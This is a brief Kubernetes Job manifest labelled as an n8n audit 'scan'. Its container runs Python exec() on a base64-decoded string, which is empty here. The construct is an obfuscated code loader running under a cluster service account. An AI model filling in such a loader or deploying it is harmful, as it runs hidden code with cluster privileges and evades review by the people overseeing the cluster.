apiVersion: batch/v1
kind: Job
metadata:
  name: eso-n8n-scan
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: scan
        image: python:3.11-slim
        command: ["/bin/sh","-c","python3 -c \"import base64,sys; exec(base64.b64decode('').decode())\" 2>&1"]
